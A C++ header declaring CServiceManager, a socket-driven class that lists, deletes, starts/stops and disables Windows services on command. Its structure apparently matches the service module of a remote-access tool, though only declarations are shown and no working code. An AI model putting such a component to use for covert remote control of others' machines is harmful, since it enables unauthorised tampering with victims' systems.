// ServiceManager.h: interface for the CServiceManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SERVICEMANAGER_H__728CAF1C_FFB1_433B_B573_C43F13BF8382__INCLUDED_)
#define AFX_SERVICEMANAGER_H__728CAF1C_FFB1_433B_B573_C43F13BF8382__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "../Contain/Manager.h"

class CServiceManager   : public CManager  
{
public:
	CServiceManager(CClientSocket *pClient);
	virtual ~CServiceManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);

	void SendServicesList(DWORD dwScType = SERVICE_WIN32);
private:
	LPBYTE getServiceList(DWORD dwScType);
	void DeleteService(LPBYTE lpBuffer, UINT nSize);
	void MyControlService(LPBYTE lpBuffer ,UINT nType);
	void DisableService(LPBYTE lpBuffer, UINT nSize, UINT nType);  // strn=0 禁用 strn=1自动 strn=2手动 

	DWORD	 dwServiceType;
};

#endif // !defined(AFX_SERVICEMANAGER_H__728CAF1C_FFB1_433B_B573_C43F13BF8382__INCLUDED_)
